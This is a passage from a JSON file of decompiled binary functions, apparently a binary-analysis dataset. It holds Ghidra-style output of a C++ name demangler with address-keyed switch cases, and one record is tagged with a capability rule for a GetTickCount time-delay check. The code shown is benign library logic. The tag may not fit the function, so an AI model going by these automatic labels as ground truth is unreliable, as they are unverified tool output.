ppppppppcVar8 + 6;\n        }\n        puVar18 = ppppppppcVar15 + ((-3 - CARRY1(uVar6, uVar6)) - ppppppppcVar9);\n        if (puVar18 == NULL) {\n            iVar11 = *(arg1 + 0x100);\n        }\n        else {\n            iVar11 = *(arg1 + 0x100);\n            ppppppppcVar15 = puVar18 + ppppppppcVar9;\n            do {\n                uVar28 = *ppppppppcVar9;\n                if (iVar11 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar12 = 0;\n                    iVar11 = 1;\n                }\n                else {\n                    iVar12 = iVar11;\n                    iVar11 = iVar11 + 1;\n                }\n                ppppppppcVar9 = ppppppppcVar9 + 1;\n                *(arg1 + 0x100) = iVar11;\n                arg1[iVar12] = uVar28;\n                arg1[0x108] = uVar28;\n            } while (ppppppppcVar9 != ppppppppcVar15);\n        }\n        if (iVar11 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            ppppppppcVar9 = 0x1;\n            iVar11 = 0;\n        }\n        else {\n            ppppppppcVar9 = iVar11 + 1;\n        }\n        *(arg1 + 0x100) = ppppppppcVar9;\n        arg1[iVar11] = 0x7d;\n        arg1[0x108] = 0x7d;\n        break;\n    case 0x405e00:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"{lambda(\";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        puVar18 = 0x42db13;\n        fcn.00407f90(arg1, arg2_00, arg3[1]);\n        iVar11 = *(arg1 + 0x100);\n        do {\n            uVar28 = *puVar18;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            puVar18 = puVar18 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = uVar28;\n            arg1[0x108] = uVar28;\n        } while (puVar18 != 0x42db15);\n        ppppppppcVar9 = appppppppcStack200;\n        sub.msvcrt.dll_sprintf(ppppppppcVar9, 0x42d8e5, *(arg3 + 2) + 1);\n        ppppppppcVar15 = ppppppppcVar9;\n        do {\n            ppppppppcVar8 = ppppppppcVar15;\n            uVar5 = *ppppppppcVar8 + 0xfefefeff & ~*ppppppppcVar8;\n            uVar6 = uVar5 & 0x80808080;\n            ppppppppcVar15 = ppppppppcVar8 + 4;\n        } while (uVar6 == 0);\n        bVar29 = (uVar5 & 0x8080) == 0;\n        if (bVar29) {\n            uVar6 = uVar6 >> 0x10;\n        }\n        if (bVar29) {\n            ppppppppcVar15 = ppppppppcVar8 + 6;\n        }\n        puVar18 = ppppppppcVar15 + ((-3 - CARRY1(uVar6, uVar6)) - ppppppppcVar9);\n        if (puVar18 == NULL) {\n            iVar11 = *(arg1 + 0x100);\n        }\n        else {\n            iVar11 = *(arg1 + 0x100);\n            ppppppppcVar15 = puVar18 + ppppppppcVar9;\n            do {\n                uVar28 = *ppppppppcVar9;\n                if (iVar11 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar12 = 0;\n                    iVar11 = 1;\n                }\n                else {\n                    iVar12 = iVar11;\n                    iVar11 = iVar11 + 1;\n                }\n                ppppppppcVar9 = ppppppppcVar9 + 1;\n                *(arg1 + 0x100) = iVar11;\n                arg1[iVar12] = uVar28;\n                arg1[0x108] = uVar28;\n            } while (ppppppppcVar9 != ppppppppcVar15);\n        }\n        if (iVar11 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            ppppppppcVar9 = 0x1;\n            iVar11 = 0;\n        }\n        else {\n            ppppppppcVar9 = iVar11 + 1;\n        }\n        *(arg1 + 0x100) = ppppppppcVar9;\n        arg1[iVar11] = 0x7d;\n        arg1[0x108] = 0x7d;\n        break;\n    case 0x405e80:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"global destructors keyed to \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x405f00:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"global constructors keyed to \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x405f80:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"non-transaction clone for \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x406000:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"transaction clone for \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x406080:\n        ppppppppcVar9 = fcn.004020f0(arg1, arg3[1]);\n        if (ppppppppcVar9 == NULL) {\n            fcn.00409420(arg1, arg2_00, arg3[1]);\n            ppppppppcVar9 = fcn.004046f0(arg1, 0x42dabf);\n        }\n        else {\n            iVar26 = 0;\n            do {\n                if ((*ppppppppcVar9 != 0x2f) || (ppppppppcVar9[1] == NULL)) {\n                    pppppppcVar22 = arg3[1];\n                    if (iVar26 == 0) {\n                        return ppppppppcVar9;\n                    }\n                    goto code_r0x004060c5;\n                }\n                ppppppppcVar9 = ppppppppcVar9[2];\n                iVar26 = iVar26 + 1;\n            } while (ppppppppcVar9 != NULL);\n            pppppppcVar22 = arg3[1];\ncode_r0x004060c5:\n            iVar24 = 0;\n            do {\n                *(arg1 + 0x134) = iVar24;\n                ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, pppppppcVar22);\n                if (iVar24 < iVar26 + -1) {\n                    ppppppppcVar15 = *(arg1 + 0x100);\n                    puVar18 = 0x42da68;\n                    do {\n                        uVar28 = *puVar18;\n                        if (ppppppppcVar15 == 0xff) {\n                            arg1[0xff] = 0;\n                            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                            ppppppppcVar9 = NULL;\n                            ppppppppcVar15 = 0x1;\n                        }\n                        else {\n                            ppppppppcVar9 = ppppppppcVar15;\n                            ppppppppcVar15 = ppppppppcVar15 + 1;\n                        }\n                        puVar18 = puVar18 + 1;\n                        *(arg1 + 0x100) = ppppppppcVar15;\n                        arg1[ppppppppcVar9] = uVar28;\n                        arg1[0x108] = uVar28;\n                    } while (puVar18 != 0x42da6a);\n                }\n                iVar24 = iVar24 + 1;\n            } while (iVar24 != iVar26);\n        }\n        break;\n    case 0x406170:\n        if ((arg2 & 0x20) == 0) {\n            if ((arg3[1] != NULL) && ((arg2 & 0x40) == 0)) {\n                appppppppcStack200[0] = *(arg1 + 0x128);\n                piStack184._0_4_ = 0;\n                *(arg1 + 0x128) = appppppppcStack200;\n                apppppppcStack176[0] = *(arg1 + 0x120);\n                appppppppcStack200[1] = arg3;\n                fcn.00407f90(arg1, arg2 & 0xffffff9f, arg3[1]);\n                *(arg1 + 0x128) = appppppppcStack200[0];\n                if (piStack184 != 0) {\n                    return appppppppcStack200[0];\n                }\n                fcn.00401cf0(arg1, 0x20);\n            }\n            ppppppppcVar9 = fcn.00408de0(arg1, arg2 & 0xffffff9f, arg3 + 2, *(arg1 + 0x128));\n        }\n        else {\n            ppppppppcVar9 = fcn.00408de0(arg1, arg2 & 0xffffff9f, arg3 + 2, *(arg1 + 0x128));\n            if (arg3[1] != NULL) {\n                ppppppppcVar9 = fcn.00407f90(arg1, arg2 & 0xffffff9f, arg3[1]);\n            }\n        }\n        break;\n    case 0x4061b0:\n        ppppppppcVar9 = arg3[1];\n        if ((arg2 & 4) == 0) {\n            iVar26 = *(ppppppppcVar9 + 1);\n            pppppppcVar22 = *ppppppppcVar9;\n            if (iVar26 != 0) {\n                ppppppppcVar15 = *(arg1 + 0x100);\n                iVar11 = 1;\n                do {\n                    uVar28 = *(pppppppcVar22 + iVar11 + -1);\n                    if (ppppppppcVar15 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        ppppppppcVar9 = NULL;\n                        ppppppppcVar15 = 0x1;\n                    }\n                    else {\n                        ppppppppcVar9 = ppppppppcVar15;\n                        ppppppppcVar15 = ppppppppcVar15 + 1;\n                    }\n                    iVar11 = iVar11 + 1;\n                    *(arg1 + 0x100) = ppppppppcVar15;\n                    arg1[ppppppppcVar9] = uVar28;\n                    arg1[0x108] = uVar28;\n                } while (iVar11 != iVar26 + 1);\n            }\n        }\n        else {\n            iVar26 = *(ppppppppcVar9 + 3);\n            pppppppcVar22 = ppppppppcVar9[2];\n            if (iVar26 != 0) {\n                ppppppppcVar15 = *(arg1 + 0x100);\n                iVar11 = 1;\n                do {\n                    uVar28 = *(pppppppcVar22 + iVar11 + -1);\n                    if (ppppppppcVar15 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        ppppppppcVar9 = NULL;\n                        ppppppppcVar15 = 0x1;\n                    }\n                    else {\n                        ppppppppcVar9 = ppppppppcVar15;\n                        ppppppppcVar15 = ppppppppcVar15 + 1;\n                    }\n                    iVar11 = iVar11 + 1;\n                    *(arg1 + 0x100) = ppppppppcVar15;\n                    arg1[ppppppppcVar9] = uVar28;\n                    arg1[0x108] = uVar28;\n                } while (iVar11 != iVar26 + 1);\n            }\n        }\n        break;\n    case 0x406240:\n        ppppppppcVar9 = arg3[1];\n        uVar6 = *ppppppppcVar9;\n        if (uVar6 == 5) {\n            ppppppppcVar9 = fcn.00402080(arg1, ppppppppcVar9 + 1);\n            if (ppppppppcVar9 == NULL) {\ncode_r0x00407ec5:\n                *(arg1 + 0x130) = 1;\n                return ppppppppcVar9;\n            }\n            uVar6 = *ppppppppcVar9;\n            if (uVar6 == 0x2f) {\n                iVar26 = *(arg1 + 0x134);\n                while (0 < iVar26) {\n                    ppppppppcVar9 = ppppppppcVar9[2];\n                    iVar26 = iVar26 + -1;\n                    if ((ppppppppcVar9 == NULL) || (*ppppppppcVar9 != 0x2f)) goto code_r0x00407ec5;\n                }\n                if ((iVar26 == 0) && (ppppppppcVar9 = ppppppppcVar9[1],  ppppppppcVar9 != NULL)) {\n                    uVar6 = *ppppppppcVar9;\n                    goto code_r0x0040624f;\n                }\n                goto code_r0x00407ec5;\n            }\n        }\ncode_r0x0040624f:\n        if ((uVar6 == 0x23) || (*arg3 == uVar6)) {\n            appppppppcStack200[0] = *(arg1 + 0x128);\n            arg3 = ppppppppcVar9;\n            goto code_r0x004047d7;\n        }\n        if (uVar6 != 0x24) goto code_r0x004047d0;\n        pppppppcVar22 = ppppppppcVar9[1];\n        appppppppcStack200[0] = *(arg1 + 0x128);\n        *(arg1 + 0x128) = appppppppcStack200;\n        apppppppcStack176[0] = *(arg1 + 0x120);\n        appppppppcStack200[1] = arg3;\n        if (pppppppcVar22 == NULL) goto code_r0x00404801;\n        goto code_r0x00404805;\n    case 0x4062b0:\n        appppppppcStack200[0] = *(arg1 + 0x128);\n        piStack184._0_4_ = 0;\n        *(arg1 + 0x128) = appppppppcStack200;\n        apppppppcStack176[0] = *(arg1 + 0x120);\n        appppppppcStack200[1] = arg3;\n        fcn.00407f90(arg1, arg2_00, arg3[2]);\n        if (piStack184 == 0) {\n            fcn.00407fc0(arg1, arg2_00, arg3);\n        }\n        *(arg1 + 0x128) = appppppppcStack200[0];\n        ppppppppcVar9 = appppppppcStack200[0];\n        break;\n    case 0x406320:\n        ppppppppcVar9 = *(arg1 + 0x128);\n        apppppppcStack176[0] = *(arg1 + 0x120);\n        piStack184._0_4_ = 0;\n        *(arg1 + 0x128) = appppppppcStack200;\n        appppppppcStack200[0] = ppppppppcVar9;\n        if ((ppppppppcVar9 == NULL) || (2 < *ppppppppcVar9[1] - 0x19U)) {\n            appppppppcStack200[1] = arg3;\n            ppppppppcVar15 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n            *(arg1 + 0x128) = ppppppppcVar9;\n            if (piStack184 != 0) {\n                return ppppppppcVar15;\n            }\n        }\n        else {\n            uVar6 = 1;\n            ppppppppcVar8 = ppppppppcVar9;\n            ppppppppcVar15 = appppppppcStack200;\n            do {\n                if (*(ppppppppcVar8 + 2) == 0) {\n                    if (3 < uVar6) {\n                        *(arg1 + 0x130) = 1;\n                        return ppppppppcVar8;\n                    }\n                    uVar7 = uVar6;\n                    uVar6 = uVar6 + 1;\n                    appppppppcStack200[uVar7 * 4] = *ppppppppcVar8;\n                    appppppppcStack200[uVar7 * 4 + 1] = ppppppppcVar8[1];\n                    (&piStack184)[uVar7 * 4] = ppppppppcVar8[2];\n                    pppppppcVar22 = ppppppppcVar8[3];\n                    appppppppcStack200[uVar7 * 4] = ppppppppcVar15;\n                    ppppppppcVar15 = appppppppcStack200 + uVar7 * 4;\n                    (&piStack184)[uVar7 * 4 + 1] = pppppppcVar22;\n                    *(arg1 + 0x128) = ppppppppcVar15;\n                    *(ppppppppcVar8 + 2) = 1;\n                }\n                ppppppppcVar8 = *ppppppppcVar8;\n            } while ((ppppppppcVar8 != NULL) && (*ppppppppcVar8[1] - 0x19U < 3));\n            appppppppcStack200[1] = arg3;\n            ppppppppcVar15 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n            *(arg1 + 0x128) = ppppppppcVar9;\n            if (piStack184 != 0) {\n                return ppppppppcVar15;\n            }\n            if (uVar6 != 1) {\n                do {\n                    uVar6 = uVar6 - 1;\n                    fcn.00407fc0(arg1, arg2_00, appppppppcStack200[uVar6 * 4 + 1]);\n                } while (uVar6 != 1);\n                ppppppppcVar9 = *(arg1 + 0x128);\n            }\n        }\n        ppppppppcVar9 = fcn.00408b60(arg1, arg2_00, arg3 + 1, ppppppppcVar9);\n        break;\n    case 0x406460:\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x406473:\n        goto code_r0x00406473;\n    }\n    return ppppppppcVar9;\n}\n",
        "token_count": 29345
    },
    "00407fc0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t ** fcn.00407fc0(uchar *arg1, ulong arg2, int32_t **arg3)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    ulong arg3_00;\n    ulong *puVar3;\n    ulong uVar4;\n    uint8_t **ppuVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t **ppiVar8;\n    int32_t **ppiVar9;\n    int32_t **ppiVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    int64_t iVar13;\n    int64_t iVar14;\n    ulong unaff_RBX;\n    uint8_t *puVar15;\n    uint32_t *puVar16;\n    uint32_t *puVar17;\n    int32_t *piVar18;\n    char *pcVar19;\n    uchar *puVar20;\n    uint8_t *puVar21;\n    uint32_t *puVar22;\n    char *pcVar23;\n    int32_t *piVar24;\n    ulong unaff_RSI;\n    char cVar25;\n    int32_t iVar26;\n    char *pcVar27;\n    int32_t iVar28;\n    int32_t *piVar29;\n    uint64_t arg2_00;\n    uchar uVar30;\n    bool bVar31;\n    uchar uVar32;\n    int32_t **ppiStack216;\n    int32_t *piStack208;\n    int32_t **appiStack200 [2];\n    int32_t *apiStack184 [17];\n    \n    arg2_00 = arg2;\n    ppiVar10 = *arg3 - 3;\n    if (0x2a < *arg3 - 3) {\ncode_r0x00408590:\n        iVar28 = *(arg1 + 0x130);\n        ppiVar9 = appiStack200[0];\n        goto joined_r0x00408598;\n    }\n    ppiVar10 = *(ppiVar10 * 4 + 0x42dcc4);\n    // switch table (43 cases) at 0x42dcc4\n    switch(ppiVar10 + 0x42dcc4) {\n    case 0x407ff4:\n        iVar13 = *(arg1 + 0x100);\n        pcVar19 = \" __vector(\";\n        do {\n            cVar25 = *pcVar19;\n            if (iVar13 == 0xff) {\n                arg1[0xff] = 0;\n                apiStack184[11] = 0x40805d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar13 = 1;\n            }\n            else {\n                iVar14 = iVar13;\n                iVar13 = iVar13 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar13;\n            arg1[iVar14] = cVar25;\n            arg1[0x108] = cVar25;\n        } while (pcVar19 != \"\");\n        if (arg3[1] == NULL) {\n            *(arg1 + 0x130) = 1;\n        }\n        else if (*(arg1 + 0x130) == 0) {\n            apiStack184[11] = 0x40860b;\n            fcn.00404790(arg1, arg2_00, arg3[1]);\n            iVar13 = *(arg1 + 0x100);\n        }\n        if (iVar13 == 0xff) {\n            arg1[0xff] = 0;\n            apiStack184[11] = 0x4086fc;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            ppiVar10 = 0x1;\n            iVar13 = 0;\n        }\n        else {\n            ppiVar10 = iVar13 + 1;\n        }\n        *(arg1 + 0x100) = ppiVar10;\n        arg1[iVar13] = 0x29;\n        arg1[0x108] = 0x29;\n        break;\n    case 0x408070:\n        arg3 = arg3[1];\n        goto joined_r0x00408350;\n    case 0x4080a0:\n        ppiVar9 = *(arg1 + 0x100);\n        pcVar19 = \" restrict\";\n        do {\n            cVar25 = *pcVar19;\n            if (ppiVar9 == 0xff) {\n                arg1[0xff] = 0;\n                apiStack184[11] = 0x408109;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                ppiVar10 = NULL;\n                ppiVar9 = 0x1;\n            }\n            else {\n                ppiVar10 = ppiVar9;\n                ppiVar9 = ppiVar9 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = ppiVar9;\n            arg1[ppiVar10] = cVar25;\n            arg1[0x108] = cVar25;\n        } while (pcVar19 != \"\");\n        break;\n    case 0x408120:\n        ppiVar9 = *(arg1 + 0x100);\n        pcVar19 = \" const\";\n        do {\n            cVar25 = *pcVar19;\n            if (ppiVar9 == 0xff) {\n                arg1[0xff] = 0;\n                apiStack184[11] = 0x40818d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                ppiVar10 = NULL;\n                ppiVar9 = 0x1;\n            }\n            else {\n                ppiVar10 = ppiVar9;\n                ppiVar9 = ppiVar9 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = ppiVar9;\n            arg1[ppiVar10] = cVar25;\n            arg1[0x108] = cVar25;\n        } while (pcVar19 != \"\");\n        break;\n    case 0x4081a0:\n        iVar13 = *(arg1 + 0x100);\n        if (iVar13 == 0xff) {\n            arg1[0xff] = 0;\n            apiStack184[11] = 0x4086cd;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            ppiVar10 = 0x1;\n            iVar13 = 0;\n        }\n        else {\n            ppiVar10 = iVar13 + 1;\n        }\n        *(arg1 + 0x100) = ppiVar10;\n        arg1[iVar13] = 0x20;\n        arg1[0x108] = 0x20;\n        goto code_r0x004081ca;\n    case 0x408200:\n        ppiVar9 = *(arg1 + 0x100);\n        pcVar19 = \" volatile\";\n        do {\n            cVar25 = *pcVar19;\n            if (ppiVar9 == 0xff) {\n                arg1[0xff] = 0;\n                apiStack184[11] = 0x40826d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                ppiVar10 = NULL;\n                ppiVar9 = 0x1;\n            }\n            else {\n                ppiVar10 = ppiVar9;\n                ppiVar9 = ppiVar9 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = ppiVar9;\n            arg1[ppiVar10] = cVar25;\n            arg1[0x108] = cVar25;\n        } while (pcVar19 != \"\");\n        break;\n    case 0x408280:\n        iVar13 = *(arg1 + 0x100);\n        if (iVar13 == 0xff) {\n            arg1[0xff] = 0;\n            apiStack184[11] = 0x40869e;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            ppiVar9 = 0x1;\n            iVar13 = 0;\n        }\n        else {\n            ppiVar9 = iVar13 + 1;\n        }\n        *(arg1 + 0x100) = ppiVar9;\n        arg1[iVar13] = 0x20;\n        arg1[0x108] = 0x20;\n        goto code_r0x004082aa;\n    case 0x408320:\n        ppiVar10 = *(arg1 + 0x100);\n        if (ppiVar10 == 0xff) {\n            arg1[0xff] = 0;\n            apiStack184[11] = 0x40866f;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar13 = 1;\n            ppiVar10 = NULL;\n        }\n        else {\n            iVar13 = ppiVar10 + 1;\n        }\n        *(arg1 + 0x100) = iVar13;\n        arg1[ppiVar10] = 0x20;\n        arg1[0x108] = 0x20;\n        arg3 = arg3[2];\njoined_r0x00408350:\n        if (arg3 == NULL) {\n            *(arg1 + 0x130) = 1;\n            return ppiVar10;\n        }\n        iVar28 = *(arg1 + 0x130);\n        ppiVar9 = appiStack200[0];\njoined_r0x00408598:\n        if (iVar28 != 0) {\n            return ppiVar10;\n        }\n        apiStack184[16] = unaff_RSI;\n        apiStack184[15] = unaff_RBX;\n        uVar7 = *arg3;\n        appiStack200[0] = uVar7;\n        switch(uVar7) {\n        case 0:\n            if ((arg2 & 4) == 0) {\n                uVar7 = *(arg3 + 2);\n                piVar24 = arg3[1];\n                if (uVar7 != 0) {\n                    ppiVar10 = *(arg1 + 0x100);\n                    iVar13 = 1;\n                    do {\n                        uVar30 = *(piVar24 + iVar13 + -1);\n                        if (ppiVar10 == 0xff) {\n                            arg1[0xff] = 0;\n                            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                            appiStack200[0] = NULL;\n                            ppiVar10 = 0x1;\n                        }\n                        else {\n                            appiStack200[0] = ppiVar10;\n                            ppiVar10 = ppiVar10 + 1;\n                        }\n                        iVar13 = iVar13 + 1;\n                        *(arg1 + 0x100) = ppiVar10;\n                        arg1[appiStack200[0]] = uVar30;\n                        arg1[0x108] = uVar30;\n                    } while (iVar13 != uVar7 + 1);\n                }\n            }\n            else {\n                piVar24 = arg3[1];\n                piVar18 = piVar24 + *(arg3 + 2);\n                while (piVar24 < piVar18) {\n                    cVar25 = *piVar24;\n                    if (((3 < piVar18 - piVar24) && (cVar25 == '_')) &&\n                       ((*(piVar24 + 1) == '_' &&\n                        ((*(piVar24 + 2) == 'U' && (piVar29 = piVar24 + 3,  piVar29 < piVar18)))))) {\n                        uVar7 = 0;\n                        do {\n                            cVar2 = *piVar29;\n                            iVar28 = cVar2;\n                            if (cVar2 - 0x30U < 10) {\n                                iVar28 = iVar28 + -0x30;\n                            }\n                            else if (cVar2 + 0xbfU < 6) {\n                                iVar28 = iVar28 + -0x37;\n                            }\n                            else {\n                                if (5 < cVar2 + 0x9fU) {\n                                    cVar25 = '_';\n                                    if (((piVar18 <= piVar29) || (cVar2 != '_')) || (cVar25 = cVar2,  0xff < uVar7))\n                                    goto code_r0x00407200;\n                                    if (*(arg1 + 0x100) == 0xff) {\n                                        arg1[0xff] = 0;\n                                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                                        *(arg1 + 0x100) = 0;\n                                    }\n                                    appiStack200[0] = *(arg1 + 0x100);\n                                    *(arg1 + 0x100) = appiStack200[0] + 1;\n                                    arg1[appiStack200[0]] = uVar7;\n                                    arg1[0x108] = uVar7;\n                                    goto code_r0x00407229;\n                                }\n                                iVar28 = iVar28 + -0x57;\n                            }\n                            piVar29 = piVar29 + 1;\n                            uVar7 = uVar7 * 0x10 + iVar28;\n                        } while (piVar29 != piVar18);\n                        cVar25 = '_';\n                    }\ncode_r0x00407200:\n                    appiStack200[0] = *(arg1 + 0x100);\n                    if (appiStack200[0] == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        iVar13 = 1;\n                        appiStack200[0] = NULL;\n                    }\n                    else {\n                        iVar13 = appiStack200[0] + 1;\n                    }\n                    *(arg1 + 0x100) = iVar13;\n                    arg1[appiStack200[0]] = cVar25;\n                    arg1[0x108] = cVar25;\n                    piVar29 = piVar24;\ncode_r0x00407229:\n                    piVar24 = piVar29 + 1;\n                }\n            }\n            break;\n        case 1:\n        case 2:\n            fcn.00407f90(arg1, arg2_00, arg3[1]);\n            iVar13 = *(arg1 + 0x100);\n            if ((arg2 & 4) == 0) {\n                puVar20 = 0x42d8d4;\n                do {\n                    uVar30 = *puVar20;\n                    if (iVar13 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        iVar14 = 0;\n                        iVar13 = 1;\n                    }\n                    else {\n                        iVar14 = iVar13;\n                        iVar13 = iVar13 + 1;\n                    }\n                    puVar20 = puVar20 + 1;\n                    *(arg1 + 0x100) = iVar13;\n                    arg1[iVar14] = uVar30;\n                    arg1[0x108] = uVar30;\n                } while (puVar20 != 0x42d8d6);\n            }\n            else {\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 1;\n                    iVar13 = 0;\n                }\n                else {\n                    iVar14 = iVar13 + 1;\n                }\n                *(arg1 + 0x100) = iVar14;\n                arg1[iVar13] = 0x2e;\n                arg1[0x108] = 0x2e;\n            }\n            piVar24 = arg3[2];\n            if (*piVar24 == 0x45) {\n                iVar13 = *(arg1 + 0x100);\n                pcVar19 = \"{default arg#\";\n                do {\n                    cVar25 = *pcVar19;\n                    if (iVar13 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 